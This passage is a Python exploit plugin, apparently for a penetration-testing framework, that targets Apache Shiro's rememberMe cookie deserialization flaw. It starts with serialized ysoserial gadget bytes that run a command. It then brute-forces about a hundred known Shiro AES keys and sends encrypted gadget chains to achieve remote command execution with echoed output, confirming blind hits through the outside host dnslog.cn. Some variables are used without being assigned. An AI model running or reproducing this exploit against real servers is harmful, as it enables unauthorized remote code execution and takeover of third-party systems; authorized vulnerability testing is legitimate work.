x01\x00\x19Pwner111445343048100.java\x01\x00\x08<clinit>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x11java/lang/Runtime\x07\x00\n\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00\x0c\x00\r\n\x00\x0b\x00\x0e\x01\x00\x04calc\x08\x00\x10\x01\x00\x04exec\x01\x00\'(Ljava/lang/String;)Ljava/lang/Process;\x0c\x00\x12\x00\x13\n\x00\x0b\x00\x14\x01\x00\rStackMapTable\x01\x00\x1eysoserial/Pwner111445380459800\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\x18\x01\x00\x06<init>\x0c\x00\x1a\x00\x08\n\x00\x19\x00\x1b\x00!\x00\x02\x00\x19\x00\x00\x00\x00\x00\x02\x00\x08\x00\x07\x00\x08\x00\x01\x00\t\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01L\xb8\x00\x0f\x12\x11\xb6\x00\x15W\xb1\x00\x00\x00\x01\x00\x16\x00\x00\x00\x03\x00\x01\x03\x00\x01\x00\x1a\x00\x08\x00\x01\x00\t\x00\x00\x00\x11\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x1c\xb1\x00\x00\x00\x00\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06uq\x00~\x00-\x00\x00\x01\xd4\xca\xfe\xba\xbe\x00\x00\x002\x00\x1b\n\x00\x03\x00\x15\x07\x00\x17\x07\x00\x18\x07\x00\x19\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\rConstantValue\x05q\xe6i\xee<mG\x18\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x03Foo\x01\x00\x0cInnerClasses\x01\x00%Lysoserial/payloads/util/Gadgets$Foo;\x01\x00\nSourceFile\x01\x00\x0cGadgets.java\x0c\x00\n\x00\x0b\x07\x00\x1a\x01\x00#ysoserial/payloads/util/Gadgets$Foo\x01\x00\x10java/lang/Object\x01\x00\x14java/io/Serializable\x01\x00\x1fysoserial/payloads/util/Gadgets\x00!\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1a\x00\x05\x00\x06\x00\x01\x00\x07\x00\x00\x00\x02\x00\x08\x00\x01\x00\x01\x00\n\x00\x0b\x00\x01\x00\x0c\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x001\x00\x0e\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00\x0f\x00\x12\x00\x00\x00\x02\x00\x13\x00\x00\x00\x02\x00\x14\x00\x11\x00\x00\x00\n\x00\x01\x00\x02\x00\x16\x00\x10\x00\tpt\x00\x04Pwnrpw\x01\x00xq\x00~\x00\x05sq\x00~\x00\x02q\x00~\x00\x11q\x00~\x00*q\x00~\x001x'


        # 来源：https://github.com/pmiaowu/BurpShiroPassiveScan/blob/c2656afe1d83d0fb4fd361bfe280df71c720da52/src/burp/Application/ShiroCipherKeyDetection/ShiroCipherKey.java
        key_list = [
            "kPH+bIxk5D2deZiIxcaaaA==", "Z3VucwAAAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==",
            "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==",
            "bWljcm9zAAAAAAAAAAAAAA==", "WcfHGU25gNnTxTlmJMeSpw==", "fCq+/xW488hMTCD+cmJ3aQ==",
            "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "1QWLxg+NYmxraMoxAXu/Iw==",
            "a2VlcE9uR29pbmdBbmRGaQ==", "5aaC5qKm5oqA5pyvAAAAAA==", "1AvVhdsgUs0FSA3SDFAdag==",
            "5RC7uBZLkByfFfJm22q/Zw==", "3AvVhdAgUs0FSA4SDFAdBg==", "a3dvbmcAAAAAAAAAAAAAAA==",
            "eXNmAAAAAAAAAAAAAAAAAA==", "U0hGX2d1bnMAAAAAAAAAAA==", "Ymx1ZXdoYWxlAAAAAAAAAA==",
            "L7RioUULEFhRyxM7a2R/Yg==", "UGlzMjAxNiVLeUVlXiEjLw==", "bWluZS1hc3NldC1rZXk6QQ==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==", "7AvVhmFLUs0KTA3Kprsdag==", "MTIzNDU2Nzg5MGFiY2RlZg==",
            "OY//C4rhfwNxCQAQCrQQ1Q==", "bTBANVpaOUw0ampRWG43TVJFcF5iXjdJ", "FP7qKJzdJOGkzoQzo2wTmA==",
            "nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3", "r0e3c16IdVkouZgk1TKVMg==",
            "k3+XHEg6D8tb2mGm7VJ3nQ==", "U3ByaW5nQmxhZGUAAAAAAA==",
            "tiVV6g3uZBGfgshesAQbjA==", "ZAvph3dsQs0FSL3SDFAdag==", "0AvVhmFLUs0KTA3Kprsdag==",
            "25BsmdYwjnfcWmnhAciDDg==", "3JvYhmBLUs0ETA5Kprsdag==", "5AvVhmFLUs0KTA3Kprsdag==",
            "6AvVhmFLUs0KTA3Kprsdag==", "6NfXkC7YVCV5DASIrEm1Rg==", "cmVtZW1iZXJNZQAAAAAAAA==",
            "8AvVhmFLUs0KTA3Kprsdag==", "8BvVhmFLUs0KTA3Kprsdag==", "9AvVhmFLUs0KTA3Kprsdag==",
            "OUHYQzxQ/W9e/UjiAGu6rg==", "aU1pcmFjbGVpTWlyYWNsZQ==", "bXRvbnMAAAAAAAAAAAAAAA==",
            "5J7bIJIV0LQSN3c9LPitBQ==", "bya2HkYo57u6fWh5theAWw==", "f/SY5TIve5WWzT4aQlABJA==",
            "WuB+y2gcHRnY2Lg9+Aqmqg==", "3qDVdLawoIr1xFd6ietnwg==", "YI1+nBV//m7ELrIyDHm6DQ==",
            "6Zm+6I2j5Y+R5aS+5ZOlAA==", "2A2V+RFLUs+eTA3Kpr+dag==", "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "SkZpbmFsQmxhZGUAAAAAAA==", "2cVtiE83c4lIrELJwKGJUw==", "fsHspZw/92PrS3XrPW+vxw==",
            "XTx6CKLo/SdSgub+OPHSrw==", "sHdIjUN6tzhl8xZMG3ULCQ==", "O4pdf+7e+mZe8NyxMTPJmQ==",
            "HWrBltGvEZc14h9VpMvZWw==", "rPNqM6uKFCyaL10AK51UkQ==", "Y1JxNSPXVwMkyvES/kJGeQ==",
            "lT2UvDUmQwewm6mMoiw4Ig==", "MPdCMZ9urzEA50JDlDYYDg==", "xVmmoltfpb8tTceuT5R7Bw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==", "ClLk69oNcA3m+s0jIMIkpg==", "Bf7MfkNR0axGGptozrebag==",
            "1tC/xrDYs8ey+sa3emtiYw==", "ZmFsYWRvLnh5ei5zaGlybw==", "cGhyYWNrY3RmREUhfiMkZA==",
            "IduElDUpDDXE677ZkhhKnQ==", "yeAAo1E8BOeAYfBlm4NG9Q==", "cGljYXMAAAAAAAAAAAAAAA==",
            "2itfW92XazYRi5ltW0M2yA==", "XgGkgqGqYrix9lI6vxcrRw==", "ertVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==", "s0KTA3mFLUprK4AvVhsdag==", "hBlzKg78ajaZuTE0VLzDDg==",
            "9FvVhtFLUs0KnA3Kprsdyg==", "d2ViUmVtZW1iZXJNZUtleQ==", "yNeUgSzL/CfiWw1GALg6Ag==",
            "NGk/3cQ6F5/UNPRh8LpMIg==", "4BvVhmFLUs0KTA3Kprsdag==", "MzVeSkYyWTI2OFVLZjRzZg==",
            "empodDEyMwAAAAAAAAAAAA==", "A7UzJgh1+EWj5oBFi+mSgw==",
             "c2hpcm9fYmF0aXMzMgAAAA==", "i45FVt72K2kLgvFrJtoZRw==", "66v1O8keKNV3TTcGPK1wzg==",
            "U3BAbW5nQmxhZGUAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "Jt3C93kMR9D5e8QzwfsiMw==",
            "MTIzNDU2NzgxMjM0NTY3OA==", "vXP33AonIp9bFwGl7aT7rA==", "V2hhdCBUaGUgSGVsbAAAAA==",
            "Q01TX0JGTFlLRVlfMjAxOQ==", "Is9zJ3pzNh2cgTHB4ua3+Q==", "SDKOLKn2J1j/2BHjeZwAoQ==",
            "NsZXjXVklWPZwOfkvk6kUA==", "GAevYnznvgNCURavBhCr1w=="]
            # , "LEGEND-CAMPUS-CIPHERKEY==", "ZWvohmPdUsAWT3=KpPqda","CrownKey==a12d/dakdad", 


        try:

            sock = self.init_socket(host, port)
            
            payload1 = self.format_payload(host, port, self.DEFAULT_CIPHERTEXT, path)
           
            sock.send(payload1.encode())

            hello = sock.recv(1024)
            #logger.info(hello)

            key_ciphertext = ''

            flag = "rememberMe=deleteMe"
            flag2= "remember-me"
            flag3= "remember-Me"

            for key in key_list:
                # 根据序列化对象的数据和key生成
                key_ciphertext = self.generate_ciphertext(key, _bb)

                sock2 = self.init_socket(host, port)
                # 构造成HTTP请求
                payload2 = self.format_payload(host, port, key_ciphertext.decode('utf-8'), path)
                # 
                sock2.send(payload2.encode())

                hello2 = sock2.recv(1024)
                #logger.info(hello2)


                                
                # rememberMe=whatever时有flag，而我们用正确的key生成的ciphertext恰好没有flag，说明这个ciphertext对应的key就是服务端的shiro使用的key
                

                # [一般情况]认为key正确情况下不返回 deleteMe ，key错误情况下返回 deleteMe
                # 确认使用的key之后，再判断是否存在漏洞
                if flag in str(hello) and flag not in str(hello2):

                    # 初始化
                    res_URLDNS = res_C3P0 = res_CB1_tomcat_cmd = res_CCK1_tomcat =  res_CCK2_tomcat = None         

                    # CC的各种链
                    # CommonsCollectionsKx 这 4 条利用链在效果上可以完全代替且超越之前的 CommonsCollection7 条链。
                    # 其中 K1,K2 是一条链的两个版本，K3,K4 是一条链的两个版本。


                    # 除CC链外的其他链
                    # 判断有无cmd命令
                    if cmd == "echo {0}":    # 说明命令未被改变
                        logger.info("尝试urldns: {0}".format(urldns_url))
                        res_URLDNS            = self.test_vuln_with_key(host, port, path, key, __bb_URLDNS, 'URLDNS', _BANNER)
    
                        logger.info("尝试C3P0: {0}".format(c3p0_host))


                        res_C3P0              = self.test_echo_with_key(host, port, path, key, __bb_C3P0, 'C3P0', _BANNER)
                        logger.info("尝试CommonsBeanutils1_tomcat")
                        res_CB1_tomcat_cmd = self.test_echo_with_key(host, port, path, key, __bb_CommonsBeanutils1_tomcat_echo, 'CommonsBeanutils1_tomcat', _BANNER)
                        logger.info("尝试CommonsCollectionsK1TomcatEcho")
                        res_CCK1_tomcat = self.test_echo_with_key(host, port, path, key, __bb, 'CommonsCollectionsK1TomcatEcho', _BANNER)
                        logger.info("CommonsCollectionsK2TomcatEcho")
                        res_CCK2_tomcat = self.test_echo_with_key(host, port, path, key, __bb2, 'CommonsCollectionsK2TomcatEcho', _BANNER)
    
                        #logger.info("尝试CommonsCollections10TomcatEcho")
                        #res_CC10_tomcat = self.test_echo_with_key(host, port, path, key, __bb_CC10_tomcat_echo, 'CommonsCollections10TomcatEcho', _BANNER)
                    else:    # 说明命令改变了
                        logger.info("尝试CommonsBeanutils1_tomcat[带命令]")
                        res_CB1_tomcat_cmd = self.test_echo_with_key_with_cmd(host, port, path, key, __bb_CommonsBeanutils1_tomcat_echo, 'CommonsBeanutils1_tomcat', cmd)
                        logger.info("尝试CommonsCollectionsK1TomcatEcho[带命令]")
                        res_CCK1_tomcat = self.test_echo_with_key_with_cmd(host, port, path, key, __bb, 'CommonsCollectionsK1TomcatEcho', cmd)
                        logger.info("CommonsCollectionsK2TomcatEcho[带命令]")
                        res_CCK2_tomcat = self.test_echo_with_key_with_cmd(host, port, path, key, __bb2, 'CommonsCollectionsK2TomcatEcho', cmd)

                    #res_CB1_jetty = self.test_echo_with_key(host, port, path, key, __bb_CommonsBeanutils1_jetty_echo, 'CommonsBeanutils1_jetty')
                    #res_CB1_resin = self.test_echo_with_key(host, port, path, key, __bb_CommonsBeanutils1_resin_echo, 'CommonsBeanutils1_resin')

                    #res_Groovy1           = self.test_echo_with_key(host, port, path, key, __bb_Groovy1, 'Groovy1')
                    #res_ROME               = self.test_vuln_with_key(host, port, path, key, __bb_ROME_ping, 'ROME')
                    # 以上已验证成功


                    #res_Hibernate1        = self.test_echo_with_key(host, port, path, key, __bb_Hibernate1, 'Hibernate1')
                    

                    # 有任何一个成功，即可认为存在漏洞
                    if res_URLDNS:
                        logger.info("存在Shiro反序列化漏洞，dnslog({0})已成功".format(urldns_url))
                        #return self.save_output(res_URLDNS)

                    if res_C3P0:
                        logger.info("存在Shiro反序列化漏洞，C3P0({0})已成功".format(c3p0_host))
                        #return self.save_output(res_C3P0)


                    # 前面先简单的dnslog，后面再进行命令执行回显
                    # 先试试CC1、CC2、CB1这些链
                    if res_CCK1_tomcat: 
                        logger.info("存在Shiro反序列化漏洞，且已找到gadget: {0}！".format("res_CCK1_tomcat"))
                        return self.save_output(res_CCK1_tomcat)
                    elif res_CCK2_tomcat:
                        logger.info("存在Shiro反序列化漏洞，且已找到gadget: {0}！".format("res_CCK2_tomcat"))
                        return self.save_output(res_CCK2_tomcat)
                    elif res_CC10_tomcat:
                        logger.info("存在Shiro反序列化漏洞，且已找到gadget: {0}！".format("res_CC10_tomcat"))
                        return self.save_output(res_CC10_tomcat)
                    elif res_CB1_tomcat_cmd:
                        logger.info("存在Shiro反序列化漏洞，且已找到gadget: {0}！".format("res_CB1_tomcat_cmd"))
                        return self.save_output(res_CB1_tomcat_cmd)
                    elif res_CB1_jetty:
                        return self.save_output(res_CB1_jetty)
                    elif res_CB1_resin:
                        return self.save_output(res_CB1_resin)
                    elif res_ROME:
                        logger.info("存在Shiro反序列化漏洞，且已找到gadget: {0}！".format("res_ROME"))
                        return self.save_output(res_ROME)
 


                    # 如果没有res，则只是表明存在shiro服务
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['Info'] = "存在Shiro服务(爆破出key)"
                    result['VerifyInfo']['Path'] = path
                    result['VerifyInfo']['Key'] = key
                    result['VerifyInfo']['Payload'] = payload2
                    result['VerifyInfo']['Response'] = hello.decode('utf-8')

                    return self.save_output(result)
                    


            # [特殊情况]避免因为响应本身就带有rememberMe，而漏报存在Shiro服务的情况
            # 其他rememberMe的形式

            if flag in str(hello) or flag2 in str(hello) or flag3 in str(hello):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Info'] = "只是存在Shiro服务(待继续检测key)"
                result['VerifyInfo']['Path'] = path
                result['VerifyInfo']['Response'] = hello.decode('utf-8')
                return self.save_output(result)


            
        except Exception as e:
            print(e)
            logger.error(e)
            #raise(e)

        


    # 参考：https://mp.weixin.qq.com/s/NZ174-fAnJzTNLzGBal7VA
    # 根据key和序列化的payload生成rememberMe的值
    def generate_ciphertext(self, key, bb):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        #secret = base64.b64decode(key)  # 这里替换密钥
        secret = base64.b64decode(key)
        iv = uuid.uuid4().bytes
        encryptor = AES.new(secret, AES.MODE_CBC, iv)
        file_body = pad(bb)
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))

        #logger.info(key + ": " + str(base64_ciphertext))

        return base64_ciphertext


    def format_payload(self, p_host, p_port, p_ciphertext, p_path=''):
        # 想要沿用之前的socket，就不能设置Connection: close 
        #payload_f = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\nConnection: close\r\nCookie: rememberMe=whatever\r\n\r\n"
        return "GET {3} HTTP/1.1\r\nHost: {0}:{1}\r\nCookie: rememberMe={2}\r\n\r\n".format(p_host, p_port, p_ciphertext, p_path)


    def format_payload_and_close(self, p_host, p_port, p_ciphertext, p_path=''):
        return "GET {3} HTTP/1.1\r\nHost: {0}:{1}\r\nCookie: rememberMe={2}\r\nConnection: close\r\n\r\n".format(p_host, p_port, p_ciphertext, p_path)


    def format_payload_echo(self, p_host, p_port, p_flag, p_ciphertext, p_path=''):
        return "GET {4} HTTP/1.1\r\nHost: {0}:{1}\r\nTestecho: {2}\r\nCookie: rememberMe={3}\r\nConnection: close\r\n\r\n".format(p_host, p_port, p_flag, p_ciphertext, p_path)

    def format_payload_cmd(self, p_host, p_port, p_cmd, p_ciphertext, p_path=''):
        return "GET {4} HTTP/1.1\r\nHost: {0}:{1}\r\ncmd: {2}\r\nTestcmd: {2}\r\nCookie: rememberMe={3}\r\nConnection: close\r\n\r\n".format(p_host, p_port, p_cmd, p_ciphertext, p_path)


    # 带回显的漏洞检测
    def test_echo_with_key(self, p_host, p_port, p_path, p_key, p_bb, p_gadget, p_BANNER):
        sock = self.init_socket(p_host, p_port)
        
        _ciphertext = self.generate_ciphertext(p_key, p_bb).decode('utf-8')
        
        # 发送带有BANNER的请求
        payload = self.format_payload_echo(p_host, p_port, p_BANNER, _ciphertext, p_path)    #TODO
        
        sock.send(payload.encode())
        
        hello = sock.recv(1024)

        #logger.info(hello)
        # 若响应中存在BANNER，则表示已成功回显，存在漏洞
        if p_BANNER in str(hello):
            result = {}
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = "存在Shiro反序列化漏洞"
            result['VerifyInfo']['Path'] = p_path
            result['VerifyInfo']['Key'] = p_key
            result['VerifyInfo']['Gadget'] = p_gadget
            #result['VerifyInfo']['Payload'] = payload
            result['VerifyInfo']['Response'] = hello.decode('utf-8')

            return result

        return False


    # 带回显的命令执行
    def test_echo_with_key_with_cmd(self, p_host, p_port, p_path, p_key, p_bb, p_gadget, p_cmd):
        sock = self.init_socket(p_host, p_port)
        
        _ciphertext = self.generate_ciphertext(p_key, p_bb).decode('utf-8')
        
        # 发送自定义命令
        # cmd = "ifconfig"
        payload = self.format_payload_cmd(p_host, p_port, p_cmd, _ciphertext, p_path)    #TODO
        
        sock.send(payload.encode())
        
        hello = sock.recv(1024)


        result = {}
        result['VerifyInfo'] = {}
        result['VerifyInfo']['Info'] = "存在Shiro反序列化漏洞"
        result['VerifyInfo']['Path'] = p_path
        result['VerifyInfo']['Key'] = p_key
        result['VerifyInfo']['Gadget'] = p_gadget
        #result['VerifyInfo']['Payload'] = payload
        result['VerifyInfo']['Response'] = hello.decode('unicode_escape')

        #logger.info(hello.decode('unicode_escape'))

        return result



    # 不带回显（使用dnslog）的漏洞检测
    def test_vuln_with_key(self, p_host, p_port, p_path, p_key, p_bb, p_gadget, p_BANNER):
        sock = self.init_socket(p_host, p_port)

        _ciphertext = self.generate_ciphertext(p_key, p_bb).decode('utf-8')


        payload = self.format_payload_and_close(p_host, p_port, _ciphertext, p_path)    #TODO
        #logger.info(payload)

        sock.send(payload.encode())

        # 不需要回显结果
        hello = sock.recv(1024)

        #logger.info(hello)
        logger.info("time.sleep(5)")
        time.sleep(5)

        if self.test_dnslog('http://admin.dnslog.cn/api/dns/qq/{0}.urldns/'.format(p_BANNER)):
            result = {}
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = "存在Shiro反序列化漏洞"
            result['VerifyInfo']['Path'] = p_path
            result['VerifyInfo']['Key'] = p_key
            result['VerifyInfo']['DNSlog'] = "{0}.urldns.{1}".format(p_BANNER, self.DOMAIN)
            result['VerifyInfo']['Gadget'] = p_gadget
            #result['VerifyInfo']['Payload'] = payload
            result['VerifyInfo']['Response'] = hello.decode('utf-8')

            return result

        return False


    def init_socket(self, p_host, p_port):
        # 只探测服务，就不用判断端口开放情况了。不要多发一次socket请求
        socket.setdefaulttimeout(5)   # 默认timeout时间
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((p_host, p_port))

        return server
    

    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url,timeout=5)   # , proxies={'http': 'http://127.0.0.1:8087'})    # proxies={'http': 'http://127.0.0.1:8087'},
        try:
            if 'True' in resp.text:
                return True
        except Exception:
            return False   



    #漏洞攻击
    # 攻击模块
    def _attack(self):
        cmd = self.get_option("command")
        result = dict()
        result['Stdout'] = self._verify(cmd)
        return self.save_output(result)



    def _options(self):
        o = OrderedDict()

        o["command"] = OptDict(selected="bash")
        return o


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
            output.show_result()
        else:
            output.fail()
        return output

register_poc(Shiro_key_detect_with_echo)
